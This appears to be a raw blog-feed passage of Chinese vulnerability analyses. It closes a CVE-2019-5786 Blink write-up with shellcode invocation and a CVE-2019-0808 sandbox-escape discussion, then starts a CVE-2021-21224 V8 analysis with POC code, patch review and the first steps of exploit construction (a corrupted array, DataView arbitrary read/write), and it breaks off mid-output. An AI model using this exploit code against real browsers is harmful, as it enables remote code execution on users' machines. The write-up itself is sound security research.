class="string">&#x27;SUCCESS&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用shellcode</span></span><br><span class="line">    <span class="built_in">window</span>.setTimeout(wfunc, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>blink的漏洞利用相对于v8的类型混淆来说看起来好像更复杂一些，需要的操作也要更麻烦一些，但是利用的核心思想仍然是类型混淆造成任意地址读写，并通过WebAssembly技术进行rce。</p><p>该漏洞利用程序开发的难点在于调试环境的获取，由于某些已知原因，国内的chromium源码编译环境异常难以搭建，只能通过符号服务器或者符号文件+二进制程序进行二进制层面的调试，这样就对exp的调试造成了比较大的阻碍。</p><h4 id="（5）简述CVE-2019-0808与沙箱逃逸"><a href="#（5）简述CVE-2019-0808与沙箱逃逸" class="headerlink" title="（5）简述CVE-2019-0808与沙箱逃逸"></a>（5）简述CVE-2019-0808与沙箱逃逸</h4><p>本节内容参考[16]，[17]</p><p>我们知道，Chrome基于多进程架构，主要包括浏览器进程和渲染进程，进程间通过IPC通信（Mojo）</p><p>其中渲染进程运行着不可信的HTML和JS代码，浏览器中的每一个tab为一个独立的进程，运行在Untrusted的低权限等级，并通过沙箱引擎隔离。因此像CVE-2019-5768这样的渲染进程中的远程代码执行漏洞仍需要结合其他高权限漏洞实现沙箱逃逸。一般来说有几种思路：1）利用浏览器进程的漏洞，比如IndexedDB，Mojo等； 2）利用操作系统内核漏洞，比如与CVE-2019-5768组合的win32k.sys内核提权漏洞CVE-2019-0808。</p><p>CVE-2019-0808是win32k.sys中的一个空指针解引用漏洞。由于代码未对返回窗口指针的类型进行检查，导致程序可以进行空指针解引用，由于win8以上的windows无法在零页分配内存，所以该漏洞的危害性相对较低，不过仍然可以配合CVE-2019-5786达到杀向逃逸的目的。</p><p>简单描述一下CVE-2019-0808的漏洞原理，xxxMNFindWindowFromPoint函数通过xxxSendMessage获取pPopupMenu，之后并未对pPopupMenu做任何校验，攻击者通过SetWinEventHook获取该事件伪造NULL指针赋值给pPopupMenu-&gt;spmenu并返回给内核，触发漏洞。</p><p>在完成了内核提权exp后，接下来需要考虑如何结合Chrome渲染进程的漏洞实现沙箱逃逸。首先可以考虑将内核提权exp以dll的形式编译，然后加载到目标进程，执行提权操作。但是由于Chrome渲染进程运行在Untrusted权限，无法直接利用漏洞获取shellcode执行权限后注入提权dll，需要考虑其他方法。</p><p>反射型dll注入就是一个比较好的方法，github中有相关项目可以直接使用[18]：</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210531200032149.png" alt="image-20210531200032149"></p><p>该利用链参考[19]，实测发现个人机器在关闭沙箱时可以执行shellcode弹出system的cmd，但是在开启沙箱的时候会造成下述状况：</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210531202300623.png" alt="image-20210531202300623"></p><p>crash log如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">VIRTUAL_MACHINE:  VMware</span><br><span class="line"></span><br><span class="line">BUGCHECK_CODE:  1</span><br><span class="line"></span><br><span class="line">BUGCHECK_P1: 114d</span><br><span class="line"></span><br><span class="line">BUGCHECK_P2: 0</span><br><span class="line"></span><br><span class="line">BUGCHECK_P3: ffff</span><br><span class="line"></span><br><span class="line">BUGCHECK_P4: 0</span><br><span class="line"></span><br><span class="line">CUSTOMER_CRASH_COUNT:  1</span><br><span class="line"></span><br><span class="line">PROCESS_NAME:  chrome.exe</span><br><span class="line"></span><br><span class="line">STACK_TEXT:  </span><br><span class="line">    &lt;Intermediate frames may have been skipped due to lack of complete unwind&gt;</span><br><span class="line">8ade0c34 779270b4 (T) badb0d00 8ade0b00 00000000 nt!KiServiceExit2+0x17a</span><br><span class="line">WARNING: Frame IP not in any known module. Following frames may be wrong.</span><br><span class="line">    &lt;Intermediate frames may have been skipped due to lack of complete unwind&gt;</span><br><span class="line">8ade0b34 00000000 (T) 00000000 00000000 00000000 0x779270b4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SYMBOL_NAME:  nt!KiServiceExit2+17a</span><br><span class="line"></span><br><span class="line">MODULE_NAME: nt</span><br><span class="line"></span><br><span class="line">IMAGE_NAME:  ntkrpamp.exe</span><br><span class="line"></span><br><span class="line">IMAGE_VERSION:  6.1.7601.17514</span><br><span class="line"></span><br><span class="line">STACK_COMMAND:  .thread ; .cxr ; kb</span><br><span class="line"></span><br><span class="line">FAILURE_BUCKET_ID:  0x1_SysCallNum_11ea_nt!KiServiceExit2+17a</span><br><span class="line"></span><br><span class="line">OS_VERSION:  7.1.7601.17514</span><br><span class="line"></span><br><span class="line">BUILDLAB_STR:  win7sp1_rtm</span><br><span class="line"></span><br><span class="line">OSPLATFORM_TYPE:  x86</span><br><span class="line"></span><br><span class="line">OSNAME:  Windows 7</span><br><span class="line"></span><br><span class="line">FAILURE_ID_HASH:  &#123;8f36ef45-2344-18c7-dc3e-a379cfe2ebc4&#125;</span><br><span class="line"></span><br><span class="line">Followup:     MachineOwner</span><br><span class="line">---------</span><br></pre></td></tr></table></figure><h2 id="四、总结与思考"><a href="#四、总结与思考" class="headerlink" title="四、总结与思考"></a>四、总结与思考</h2><p>该漏洞为blink相关的逻辑漏洞，由于异步的特性导致代码逻辑出现问题，最终生成了两个指向同一内存的指针，该漏洞的质量很高，在被曝出时就被发现与CVE-2019-0808配合绕过沙箱实现RCE，是一个比较值得研究的blink漏洞。</p><h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><p>[1] <a class="link"   href="https://developer.mozilla.org/zh-CN/docs/Web/API/FileReader" >https://developer.mozilla.org/zh-CN/docs/Web/API/FileReader<i class="fas fa-external-link-alt"></i></a></p><p>[2] <a class="link"   href="https://www.chromium.org/developers/how-tos/debugging-on-windows/windbg-help" >https://www.chromium.org/developers/how-tos/debugging-on-windows/windbg-help<i class="fas fa-external-link-alt"></i></a></p><p>[3] <a class="link"   href="https://www.chromium.org/getting-involved/download-chromium" >https://www.chromium.org/getting-involved/download-chromium<i class="fas fa-external-link-alt"></i></a></p><p>[4] <a class="link"   href="https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/612429/" >https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/612429/<i class="fas fa-external-link-alt"></i></a></p><p>[5] <a class="link"   href="https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win/612432/" >https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win/612432/<i class="fas fa-external-link-alt"></i></a></p><p>[6] <a class="link"   href="http://www.ruanyifeng.com/blog/2018/07/web-worker.html" >http://www.ruanyifeng.com/blog/2018/07/web-worker.html<i class="fas fa-external-link-alt"></i></a></p><p>[7] <a class="link"   href="https://www.cnblogs.com/SZxiaochun/p/8017475.html" >https://www.cnblogs.com/SZxiaochun/p/8017475.html<i class="fas fa-external-link-alt"></i></a></p><p>[8] <a class="link"   href="https://www.cnblogs.com/yoyo-sincerely/p/8658075.html" >https://www.cnblogs.com/yoyo-sincerely/p/8658075.html<i class="fas fa-external-link-alt"></i></a></p><p>[9] <a class="link"   href="https://zhuanlan.zhihu.com/p/94588204" >https://zhuanlan.zhihu.com/p/94588204<i class="fas fa-external-link-alt"></i></a></p><p>[10] <a class="link"   href="https://www.jianshu.com/p/c2cd6c7e1976" >https://www.jianshu.com/p/c2cd6c7e1976<i class="fas fa-external-link-alt"></i></a></p><p>[11] <a class="link"   href="https://www.anquanke.com/post/id/194351" >https://www.anquanke.com/post/id/194351<i class="fas fa-external-link-alt"></i></a></p><p>[12] <a class="link"   href="https://www.4hou.com/posts/7OYQ" >https://www.4hou.com/posts/7OYQ<i class="fas fa-external-link-alt"></i></a></p><p>[13] <a class="link"   href="https://github.com/exodusintel/CVE-2019-5786/" >https://github.com/exodusintel/CVE-2019-5786/<i class="fas fa-external-link-alt"></i></a></p><p>[14] <a class="link"   href="https://programlife.net/2019/03/25/cve-2019-5786-chrome-filereader-use-after-free-vulnerability-analysis/" >https://programlife.net/2019/03/25/cve-2019-5786-chrome-filereader-use-after-free-vulnerability-analysis/<i class="fas fa-external-link-alt"></i></a></p><p>[15] <a class="link"   href="https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/" >https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/<i class="fas fa-external-link-alt"></i></a></p><p>[16] <a class="link"   href="https://www.anquanke.com/post/id/197892" >https://www.anquanke.com/post/id/197892<i class="fas fa-external-link-alt"></i></a></p><p>[17] <a class="link"   href="https://blogs.360.cn/post/RootCause_CVE-2019-0808_CH.html" >https://blogs.360.cn/post/RootCause_CVE-2019-0808_CH.html<i class="fas fa-external-link-alt"></i></a></p><p>[18] <a class="link"   href="https://github.com/monoxgas/sRDI" >https://github.com/monoxgas/sRDI<i class="fas fa-external-link-alt"></i></a></p><p>[19] <a class="link"   href="https://github.com/exodusintel/CVE-2019-0808" >https://github.com/exodusintel/CVE-2019-0808<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Blink-FileReader-UAF漏洞（CVE-2019-5786）&quot;&gt;&lt;a href=&quot;#Blink-FileReader-UAF漏洞（CVE-2019-5786）&quot; class=&quot;headerlink&quot; title=&quot;Blink FileReader U</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://fa1lr4in.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="浏览器" scheme="https://fa1lr4in.github.io/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    <category term="漏洞分析" scheme="https://fa1lr4in.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-21224</title>
    <link href="https://fa1lr4in.github.io/2021/05/12/CVE-2021-21224/"/>
    <id>https://fa1lr4in.github.io/2021/05/12/CVE-2021-21224/</id>
    <published>2021-05-12T09:32:05.000Z</published>
    <updated>2022-04-19T09:10:58.169Z</updated>
    
    <content type="html"><![CDATA[<h1 id="V8远程代码执行漏洞"><a href="#V8远程代码执行漏洞" class="headerlink" title="V8远程代码执行漏洞"></a>V8远程代码执行漏洞</h1><h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1、漏洞简述"><a href="#1、漏洞简述" class="headerlink" title="1、漏洞简述"></a>1、漏洞简述</h3><ul><li>漏洞名称：V8远程代码执行漏洞</li><li>漏洞编号：CVE-2021-21224</li><li>漏洞类型：JIT优化导致可构造超长数组进行任意地址读写</li><li>漏洞影响：远程代码执行</li><li>CVSS3.0：N/A</li><li>CVSS2.0：N/A</li><li>漏洞危害等级：严重</li></ul><h3 id="2、组件和漏洞概述"><a href="#2、组件和漏洞概述" class="headerlink" title="2、组件和漏洞概述"></a>2、组件和漏洞概述</h3><p>V8是Google使用C++编写的开源高性能JavaScript和WebAssembly引擎。它被广泛用于用于Chrome和Node.js等场景中。它实现了ECMAScript和WebAssembly功能。V8既可以在Windows 7及以上版本，macOS 10.12+和使用x64，IA-32，ARM或MIPS处理器的Linux等操作系统上运行。也可以独立运行，还可以嵌入到任何C ++应用程序中。</p><h3 id="3、相关链接"><a href="#3、相关链接" class="headerlink" title="3、相关链接"></a>3、相关链接</h3><p>issue 1195777</p><p><a class="link"   href="https://chromereleases.googleblog.com/2021/04/stable-channel-update-for-desktop_20.html" >https://chromereleases.googleblog.com/2021/04/stable-channel-update-for-desktop_20.html<i class="fas fa-external-link-alt"></i></a></p><h3 id="4、解决方案"><a href="#4、解决方案" class="headerlink" title="4、解决方案"></a>4、解决方案</h3><p><a class="link"   href="https://chromereleases.googleblog.com/2021/04/stable-channel-update-for-desktop_20.html" >https://chromereleases.googleblog.com/2021/04/stable-channel-update-for-desktop_20.html<i class="fas fa-external-link-alt"></i></a></p><h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1、环境搭建"><a href="#1、环境搭建" class="headerlink" title="1、环境搭建"></a>1、环境搭建</h3><p>安装89.0.4389.90的Chrome浏览器</p><h3 id="2、复现过程"><a href="#2、复现过程" class="headerlink" title="2、复现过程"></a>2、复现过程</h3><p>1、在Chrome快捷方式-&gt;目标后面加上”–no-sandbox”，并使用该快捷方式启动Chrome，用来创建一个关闭沙箱的Chrome进程。</p><p>2、将漏洞文件拖入浏览器中执行</p><p><img src="/2021/05/12/CVE-2021-21224/image-20210428110845631.png" alt="image-20210428110845631"></p><h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1、基本信息"><a href="#1、基本信息" class="headerlink" title="1、基本信息"></a>1、基本信息</h3><ul><li>漏洞文件：representation-change.cc</li><li>漏洞函数：RepresentationChanger::GetWord32RepresentationFor</li></ul><h3 id="2、补丁对比"><a href="#2、补丁对比" class="headerlink" title="2、补丁对比"></a>2、补丁对比</h3><p>观察v8修复漏洞详情，可以看到，在调用 TruncateInt64ToInt32 函数之前增加了一项检查，检查了当 output_type 为 Type::Unsigned32 时，user_info的类型是否为 TypeCheckKind::kNone。</p><p><img src="/2021/05/12/CVE-2021-21224/image-20210508152028808.png" alt="image-20210508152028808"></p><h3 id="3、漏洞分析"><a href="#3、漏洞分析" class="headerlink" title="3、漏洞分析"></a>3、漏洞分析</h3><h4 id="（1）POC分析"><a href="#（1）POC分析" class="headerlink" title="（1）POC分析"></a>（1）POC分析</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123;                                                      </span><br><span class="line">        <span class="keyword">let</span> x = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (a) x = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">        <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="built_in">Math</span>.sign(<span class="number">0</span> - <span class="built_in">Math</span>.max(<span class="number">0</span>, x, -<span class="number">1</span>)));</span><br><span class="line">        arr.shift();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i)</span><br><span class="line">        foo(<span class="literal">false</span>);                               </span><br><span class="line">    foo(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>分析下poc，在循环执行foo(false)函数时，Ignation会收集类型反馈并进行投机优化，交由TurboFan处理，此时最大值始终为0，最终会得到一个长度为0的数组，经由shift处理时，长度仍然为0；</p><p>最后执行foo(true)时，x值变为0XFFFFFFFF，当执行创建数组的操作时，执行了TruncateInt64ToInt32函数直接进行截断，而未进行类型检查，导致x被当作-1进行操作，<strong>此时创造了TurboFan意料之外的数据范围1</strong>，最终执行shift函数时创造了长度为-1的数组。</p><h4 id="（2）执行流分析"><a href="#（2）执行流分析" class="headerlink" title="（2）执行流分析"></a>（2）执行流分析</h4><p>在EscapeAnalysis阶段，程序的执行流按照我们所看到的那样，通过max函数确定函数的范围为（0，4294967295），经过sub操作后范围为（-4294967295，0），最后进行sign运算，得到的范围为（-1，0），最终进行边界检查，得到范围为（0，0）</p><p><img src="/2021/05/12/CVE-2021-21224/image-20210512104858664.png" alt="image-20210512104858664"></p><p>而在SimplifiedLowering阶段，在select数据范围之后，调用了TruncateInt64ToInt32，最终在CheckedUint32Bounds得到的数据范围为Range（0，0）.</p><p><img src="/2021/05/12/CVE-2021-21224/image-20210512105759695.png" alt="image-20210512105759695"></p><h4 id="（3）动态验证"><a href="#（3）动态验证" class="headerlink" title="（3）动态验证"></a>（3）动态验证</h4><p>调试v8，发现执行到 RepresentationChanger::GetWord32RepresentationFor 函数处理 output_rep 为  MachineRepresentation::kWord64 时的逻辑如下，此时的use_info的类型为 kSignedSmall 类型，由于该处并未对use_info执行检查，导致opcode为 TruncateInt64ToInt32 。</p><p><img src="/2021/05/12/CVE-2021-21224/image-20210511201315964.png" alt="image-20210511201315964"></p><p>而当对漏洞代码进行修复后，则会执行CheckedUint64ToInt32或CheckedInt64ToInt32函数来对output_rep进行处理。</p><p><img src="/2021/05/12/CVE-2021-21224/image-20210511202300798.png" alt="image-20210511202300798"></p><p>修复漏洞后的执行流程如下，此时确实调用了CheckedInt64ToInt32函数对操作数进行了处理</p><p><img src="/2021/05/12/CVE-2021-21224/image-20210511204837988.png" alt="image-20210511204837988"></p><h4 id="（4）EXP构造"><a href="#（4）EXP构造" class="headerlink" title="（4）EXP构造"></a>（4）EXP构造</h4><p>公开exp的构造方式并非为传统的构造addressOf和fakeObject原语以及任意读写原语，而是通过DataView对象直接操作漏洞bufffer进行任意读写。</p><h5 id="（1）构造超长数组"><a href="#（1）构造超长数组" class="headerlink" title="（1）构造超长数组"></a>（1）构造超长数组</h5><p>根据上面的分析，可以得到一个长度为-1的超长的数组，下面是定义的gadget代码以及得到长度为-1数组的代码，代码中LeakArrayBuffer继承于ArrayBuffer，重写的LeakArrayBuffer与ArrayBuffer不同的地方在于定义了一个变量slot，定义该变量的目的就是为了通过类型混淆达到相对地址读的作用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="string">&quot;0x&quot;</span>+i.toString(<span class="number">16</span>));</span><br><span class="line">    &#125; <span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80000</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="class"><span class="keyword">class</span> <span class="title">LeakArrayBuffer</span> <span class="keyword">extends</span> <span class="title">ArrayBuffer</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="title">constructor</span>(<span class="params">size</span>)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(size);                                                        <span class="comment">//super()相当与父类call，其实就是实现父类原有的功能，这里的super就是生成大小为size的缓冲区。</span></span><br><span class="line">            <span class="built_in">this</span>.slot = <span class="number">0xb33f</span>;                                                 <span class="comment">//定义了一个变量slot，</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123;                                                      </span><br><span class="line">        <span class="keyword">let</span> x = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (a) x = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">        <span class="comment">//console.log(x);    </span></span><br><span class="line">        <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="built_in">Math</span>.sign(<span class="number">0</span> - <span class="built_in">Math</span>.max(<span class="number">0</span>, x, -<span class="number">1</span>)));</span><br><span class="line">        arr.shift();</span><br><span class="line">        <span class="comment">//console.log(arr.length);</span></span><br><span class="line">        <span class="keyword">let</span> local_arr = <span class="built_in">Array</span>(<span class="number">2</span>);</span><br><span class="line">        local_arr[<span class="number">0</span>] = <span class="number">5.1</span>;<span class="comment">//4014666666666666</span></span><br><span class="line">        <span class="keyword">let</span> buff = <span class="keyword">new</span> LeakArrayBuffer(<span class="number">0x1000</span>);<span class="comment">//byteLength idx=8</span></span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">0x1122</span>;</span><br><span class="line">        <span class="keyword">return</span> [arr, local_arr, buff];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i)</span><br><span class="line">        foo(<span class="literal">false</span>);                               </span><br><span class="line">    [corrupt_arr, rwarr, corrupt_buff] = foo(<span class="literal">true</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(corrupt_arr.length);</span><br><span class="line">    %DebugPrint(corrupt_arr);</span><br><span class="line">    %SystemBreak();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行结果如下，从下面的执行结果可以看出corrupt_arr数组的长度为-1，并且打印出了corrupt_arr参数地址以及第0-17元素的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/v8/v8/out/x64.release# ./d8 test1.js --allow-natives-syntax</span><br><span class="line">-1</span><br><span class="line">DebugPrint: 0x11930809ca05: [JSArray]</span><br><span class="line"> - map: 0x1193082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x11930820b959 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x11930809c9f9 &lt;FixedArray[67244566]&gt; [HOLEY_SMI_ELEMENTS]</span><br><span class="line"> - length: -1</span><br><span class="line"> - properties: 0x11930804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x1193080446c1: [String] in ReadOnlySpace: #length: 0x11930818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x11930809c9f9 &lt;FixedArray[67244566]&gt; &#123;</span><br><span class="line">           0: 4386</span><br><span class="line">           1: 0x1193082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line">           2: 0x11930804222d &lt;FixedArray[0]&gt;</span><br><span class="line">           3: 0x11930809c9f9 &lt;FixedArray[67244566]&gt;</span><br><span class="line">           4: -1</span><br><span class="line">           5: 0x119308042205 &lt;Map&gt;</span><br><span class="line">           6: 2</span><br><span class="line">         7-8: 0x11930804242d &lt;the_hole&gt;</span><br><span class="line">           9: 0x119308243a19 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line">          10: 0x11930804222d &lt;FixedArray[0]&gt;</span><br><span class="line">          11: 0x11930809ca39 &lt;FixedDoubleArray[2]&gt;</span><br><span class="line">          12: 2</span><br><span class="line">          13: 0x1193080422c5 &lt;Map[4]&gt;</span><br><span class="line">          14: 0x119308042a95 &lt;Map&gt;</span><br><span class="line">          15: 2</span><br><span class="line">          16: 858993459</span><br><span class="line">          17: 537539379</span><br><span class="line">Received signal 11 SEGV_ACCERR 1193fff7fffc</span><br><span class="line"></span><br><span class="line">==== C stack trace ===============================</span><br><span class="line"></span><br><span class="line"> [0x55d5d79b7b57]</span><br><span class="line"> [0x7f2be3f1c980]</span><br><span class="line"> [0x55d5d717ff59]</span><br><span class="line"> [0x55d5d717fc77]</span><br><span class="line"> [0x55d5d6eece05]</span><br><span class="line"> [0x55d5d6eeb455]</span><br><span class="line"> [0x55d5d6eeeecd]</span><br><span class="line"> [0x55d5d6ee718d]</span><br><span class="line"> [0x55d5d6edd188]</span><br><span class="line"> [0x55d5d6edc522]</span><br><span class="line"> [0x55d5d72fd95e]</span><br><span class="line"> [0x55d5d72f177e]</span><br><span class="line"> [0x1193000b2213]</span><br><span class="line">[end of stack trace]</span><br><span class="line">段错误 (核心已转储)</span><br><span class="line">root@ubuntu:~/v8/v8/out/x64.release#</span><br></pre></td></tr></table></figure><h5 id="（2）构建恶意DataView对象进行漏洞利用"><a href="#（2）构建恶意DataView对象进行漏洞利用" class="headerlink" title="（2）构建恶意DataView对象进行漏洞利用"></a>（2）构建恶意DataView对象进行漏洞利用</h5><p>这一步是这个漏洞利用比较精妙的部分了，首先通过查看内存获取corrupt_arr与rwarr的偏移量（调试信息中，上面的是rwarr的内存，下面的是corrupt_arr的内存，由于corrupt_arr的数组已经损坏，所以将corrupt_arr放在上面读取信息时会出错）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="regexp">/v8/</span>v8/out/x64.release# ./d8 test1.js --allow-natives-syntax</span><br><span class="line">-<span class="number">1</span></span><br><span class="line"><span class="attr">DebugPrint</span>: <span class="number">0xda708098035</span>: [JSArray]</span><br><span class="line"> - map: <span class="number">0x0da708243a19</span> &lt;<span class="built_in">Map</span>(HOLEY_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x0da70820b959</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x0da708098049</span> &lt;FixedDoubleArray[<span class="number">2</span>]&gt; [HOLEY_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: <span class="number">2</span></span><br><span class="line"> - properties: <span class="number">0x0da70804222d</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    <span class="number">0xda7080446c1</span>: [<span class="built_in">String</span>] <span class="keyword">in</span> ReadOnlySpace: #length: <span class="number">0x0da70818215d</span> &lt;AccessorInfo&gt; (<span class="keyword">const</span> accessor descriptor), <span class="attr">location</span>: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x0da708098049</span> &lt;FixedDoubleArray[<span class="number">2</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">5.1</span></span><br><span class="line">           <span class="number">1</span>: &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br><span 